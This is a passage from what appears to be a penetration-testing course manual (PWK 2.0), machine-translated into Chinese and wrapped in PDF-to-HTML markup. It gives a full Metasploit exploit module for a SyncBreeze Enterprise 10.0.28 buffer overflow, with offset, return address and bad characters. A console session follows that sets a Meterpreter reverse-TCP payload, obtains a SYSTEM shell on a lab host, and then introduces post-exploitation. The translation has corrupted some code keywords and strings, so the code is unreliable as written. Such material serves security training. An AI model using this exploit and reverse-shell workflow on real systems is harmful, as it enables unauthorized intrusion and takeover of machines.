<div style="position:absolute;top:107958;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt; 'SyncBreeze Enterprise 缓冲区溢出',</font></font></nobr></div>
<div style="position:absolute;top:107975;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'说明' =&gt; %q(</font></font></nobr></div>
<div style="position:absolute;top:107992;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该模块将我们对 SyncBreeze Enterprise 10.0.28 的 Python 漏洞利用移植到 MSF。</font></font></nobr></div>
<div style="position:absolute;top:108009;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">),</font></font></nobr></div>
<div style="position:absolute;top:108026;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'执照'    </font></font></nobr></div>
<div style="position:absolute;top:108026;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt; MSF_LICENSE，</font></font></nobr></div>
<div style="position:absolute;top:108043;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'作者'    </font></font></nobr></div>
<div style="position:absolute;top:108043;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt; ['攻击性安全'，'offsec']，</font></font></nobr></div>
<div style="position:absolute;top:108060;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'参考' =&gt;</font></font></nobr></div>
<div style="position:absolute;top:108077;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[</font></font></nobr></div>
<div style="position:absolute;top:108094;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">['教育局'，'42886']</font></font></nobr></div>
<div style="position:absolute;top:108111;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">],</font></font></nobr></div>
<div style="position:absolute;top:108127;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'默认选项' =&gt;</font></font></nobr></div>
<div style="position:absolute;top:108144;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{ </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:108283;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="92"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 92 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:108316;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:109393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:109393;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:109393;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">709</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108412;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'EXITFUNC' =&gt; '线程'</font></font></nobr></div>
<div style="position:absolute;top:108428;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">},</font></font></nobr></div>
<div style="position:absolute;top:108445;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'平台' =&gt; '赢',</font></font></nobr></div>
<div style="position:absolute;top:108462;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'有效载荷'    </font></font></nobr></div>
<div style="position:absolute;top:108462;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt;</font></font></nobr></div>
<div style="position:absolute;top:108480;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:108496;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'BadChars' =&gt; "\x00\x0a\x0d\x25\x26\x2b\x3d",</font></font></nobr></div>
<div style="position:absolute;top:108513;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'空格' =&gt; 500</font></font></nobr></div>
<div style="position:absolute;top:108530;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">},</font></font></nobr></div>
<div style="position:absolute;top:108547;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'目标'    </font></font></nobr></div>
<div style="position:absolute;top:108547;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=&gt;</font></font></nobr></div>
<div style="position:absolute;top:108564;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[</font></font></nobr></div>
<div style="position:absolute;top:108581;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">['SyncBreeze Enterprise 10.0.28',</font></font></nobr></div>
<div style="position:absolute;top:108598;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:108615;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'Ret' =&gt; 0x10090c83，#JMP ESP -- libssp.dll</font></font></nobr></div>
<div style="position:absolute;top:108632;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'偏移' =&gt; 780</font></font></nobr></div>
<div style="position:absolute;top:108649;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}]</font></font></nobr></div>
<div style="position:absolute;top:108666;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">],</font></font></nobr></div>
<div style="position:absolute;top:108683;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'特权' =&gt; 真，</font></font></nobr></div>
<div style="position:absolute;top:108700;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'披露日期' =&gt; '2019 年 10 月 20 日',</font></font></nobr></div>
<div style="position:absolute;top:108717;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'默认目标' =&gt; 0))</font></font></nobr></div>
<div style="position:absolute;top:108751;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">register_options([Opt::RPORT(80)])</font></font></nobr></div>
<div style="position:absolute;top:108768;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:108802;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义检查</font></font></nobr></div>
<div style="position:absolute;top:108819;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">res = send_request_cgi(</font></font></nobr></div>
<div style="position:absolute;top:108836;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'uri' =&gt; '/',</font></font></nobr></div>
<div style="position:absolute;top:108853;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'方法' =&gt; '获取'</font></font></nobr></div>
<div style="position:absolute;top:108870;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">)</font></font></nobr></div>
<div style="position:absolute;top:108904;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 res &amp;&amp; res.code == 200</font></font></nobr></div>
<div style="position:absolute;top:108921;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">product_name = res.body.scan(/(Sync Breeze Enterprise v[^&lt;]*)/i).flatten.first</font></font></nobr></div>
<div style="position:absolute;top:108937;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 product_name =~ /10\.0\.28/</font></font></nobr></div>
<div style="position:absolute;top:108954;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回漏洞利用::检查代码::出现</font></font></nobr></div>
<div style="position:absolute;top:108972;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:108989;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:109022;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回漏洞利用::检查代码::安全</font></font></nobr></div>
<div style="position:absolute;top:109039;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:109073;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">def漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:109090;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">print_status("正在生成漏洞利用...")</font></font></nobr></div>
<div style="position:absolute;top:109107;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp = rand_text_alpha(目标['偏移'])</font></font></nobr></div>
<div style="position:absolute;top:109124;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp &lt;&lt; [target.ret].pack('V')</font></font></nobr></div>
<div style="position:absolute;top:109141;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp &lt;&lt; rand_text(4)</font></font></nobr></div>
<div style="position:absolute;top:109158;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp &lt;&lt; make_nops(10) # NOP sled 以确保我们登陆 jmp 到 shellcode</font></font></nobr></div>
<div style="position:absolute;top:109175;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exp &lt;&lt; payload.encoded</font></font></nobr></div>
<div style="position:absolute;top:109209;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">print_status("发送漏洞利用...")</font></font></nobr></div>
<div style="position:absolute;top:109243;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">send_request_cgi(</font></font></nobr></div>
<div style="position:absolute;top:109260;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'uri' =&gt; '/登录',</font></font></nobr></div>
<div style="position:absolute;top:109277;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'方法' =&gt; 'POST',</font></font></nobr></div>
<div style="position:absolute;top:109294;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'连接' =&gt; '保持活动'，</font></font></nobr></div>
<div style="position:absolute;top:109311;left:157"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'vars_post' =&gt; {</font></font></nobr></div>
<div style="position:absolute;top:109328;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'用户名' =&gt; "#{exp}",</font></font></nobr></div>
<div style="position:absolute;top:109345;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'密码' =&gt; "fakepsw" </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:109471;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="93"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 93 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:109504;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:110581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:110581;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:110581;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">710</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109600;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:109616;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">)</font></font></nobr></div>
<div style="position:absolute;top:109650;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理程序</font></font></nobr></div>
<div style="position:absolute;top:109668;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">断开</font></font></nobr></div>
<div style="position:absolute;top:109684;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:109701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font></font></nobr></div>
<div style="position:absolute;top:109721;left:348"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 793 - Metasploit 漏洞利用模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用完成后，我们可以启动 Metasploit 并搜索它。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo msfconsole -q</font></font></font></b></nobr></div>
<div style="position:absolute;top:109802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 启动持久处理程序...</font></font></nobr></div>
<div style="position:absolute;top:109836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索同步风</font></font></font></b></nobr></div>
<div style="position:absolute;top:109870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配模块</font></font></nobr></div>
<div style="position:absolute;top:109887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:109921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:109921;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">披露日期排名检查描述</font></font></nobr></div>
<div style="position:absolute;top:109938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重刑</font></font></nobr></div>
<div style="position:absolute;top:109955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:109955;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------------- ---- ----- -------</font></font></nobr></div>
<div style="position:absolute;top:109972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----</font></font></nobr></div>
<div style="position:absolute;top:109989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用/windows/fileformat/syncbreeze_xml 2017-03-29 正常 无同步 Br</font></font></nobr></div>
<div style="position:absolute;top:110006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eeze Enterprise 9.5.16 - 导入命令缓冲区溢出</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:110023;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用/windows/http/syncbreeze/syncbreeze </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2019-10-20 优秀 是 SyncBre</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eze 企业缓冲区溢出</font></font></nobr></div>
<div style="position:absolute;top:110074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用/windows/http/syncbreeze_bof    </font></font></nobr></div>
<div style="position:absolute;top:110074;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2017-03-15 伟大的 Yes Sync Br</font></font></nobr></div>
<div style="position:absolute;top:110091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eeze Enterprise GET 缓冲区溢出</font></font></nobr></div>
<div style="position:absolute;top:110124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用exploit/windows/http/syncbreeze/syncbreeze</font></font></font></b></nobr></div>
<div style="position:absolute;top:110158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze/syncbreeze）&gt; </font></font></nobr></div>
<div style="position:absolute;top:110178;left:343"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 794 - 定位自定义漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们注意到对</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">syncbreeze</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的搜索</font><font style="vertical-align: inherit;">现在包含三个结果，第二个结果是</font></font></nobr></div>
<div style="position:absolute;top:110226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的自定义漏洞。</font><font style="vertical-align: inherit;">接下来我们将选择一个有效载荷，设置所需的参数，并执行一个</font></font></nobr></div>
<div style="position:absolute;top:110246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞检查。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze/syncbreeze）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 PAYLOAD windows/meterpreter/rev</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:110298;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">erse_tcp</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PAYLOAD =&gt; windows/shell/reverse_tcp</font></font></nobr></div>
<div style="position:absolute;top:110348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze/syncbreeze）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 RHOSTS 10.11.0.22</font></font></font></b></nobr></div>
<div style="position:absolute;top:110366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS =&gt; 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:110399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze/syncbreeze）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:110416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:110450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze/syncbreeze）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查</font></font></font></b></nobr></div>
<div style="position:absolute;top:110467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22:80 - 目标似乎易受攻击。</font></font></nobr></div>
<div style="position:absolute;top:110487;left:281"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 795 - 设置参数和检查可利用性</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们启动我们的漏洞利用以获得反向shell。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:110659;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="94"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 94 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:110692;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:111769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:111769;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:111769;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">711</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze/syncbreeze）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:110824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:4444 上启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:110841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 生成漏洞利用...</font></font></nobr></div>
<div style="position:absolute;top:110858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送漏洞利用...</font></font></nobr></div>
<div style="position:absolute;top:110875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（179779 字节）到 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:110892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Meterpreter 会话 2 在 05:19:32 打开 (10.11.0.4:4444 -&gt; 10.11.0.22:1923)</font></font></nobr></div>
<div style="position:absolute;top:110925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">getuid</font></font></font></b></nobr></div>
<div style="position:absolute;top:110943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器用户名：NT AUTHORITY\SYSTEM</font></font></nobr></div>
<div style="position:absolute;top:110960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:110979;left:266"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 796 - 使用自定义 MSF 模块利用 SyncBreeze</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的。</font><font style="vertical-align: inherit;">它工作得很好。</font><font style="vertical-align: inherit;">由于我们新的 Metasploit 漏洞利用模块，我们有了一个 shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111042;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.4.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 为您的 SyncBreeze 漏洞创建一个新的 Metasploit 模块。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5 使用 Metasploit 进行后期开发</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们获得了对目标机器的访问权，我们就可以进入后开发阶段</font></font></nobr></div>
<div style="position:absolute;top:111171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们收集信息，采取措施维护我们的访问权限，转向其他机器等。</font></font></nobr></div>
<div style="position:absolute;top:111204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 框架有几个有趣的后开发特性和模块，它们可以</font></font></nobr></div>
<div style="position:absolute;top:111223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简化后开发过程的许多方面。</font><font style="vertical-align: inherit;">除了内置的 Meterpreter</font></font></nobr></div>
<div style="position:absolute;top:111242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，已经编写了许多后利用 MSF 模块，它们采用主动</font></font></nobr></div>
<div style="position:absolute;top:111262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话作为参数。</font></font></nobr></div>
<div style="position:absolute;top:111295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们仔细看看其中的一些后开发功能。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111357;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">养成</font></font></i><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">从 Meterpreter 会话</font></i><i><font style="vertical-align: inherit;">调用</font></i></font><b><font color="#000000" style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帮助</font></font></font></b><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">命令</font></i><i><font style="vertical-align: inherit;">的习惯，</font></i></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并</font></font></i></nobr></div>
<div style="position:absolute;top:111376;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">探索可能的行动。</font><font style="vertical-align: inherit;">请务必定期执行此操作，因为框架是</font></font></i></nobr></div>
<div style="position:absolute;top:111395;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总是在大力开发和定期添加新选项。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111458;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.5.1</font></font></i></nobr></div>
<div style="position:absolute;top:111458;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">核心后开发功能</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们之前看到的，我们可以导航文件系统并列出操作系统和用户信息</font></font></nobr></div>
<div style="position:absolute;top:111515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在受感染的主机上运行进程。</font><font style="vertical-align: inherit;">我们也可以上传和下载文件</font></font></nobr></div>
<div style="position:absolute;top:111534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接从 Meterpreter 命令提示符。</font></font></nobr></div>
<div style="position:absolute;top:111567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 提供了其他基本的后开发功能，其中包括</font></font></nobr></div>
<div style="position:absolute;top:111587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">屏幕截图</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">截取受感染桌面的</font><i><font style="vertical-align: inherit;">屏幕</font></i><font style="vertical-align: inherit;">截图的选项</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">截图</font></font></font></b></nobr></div>
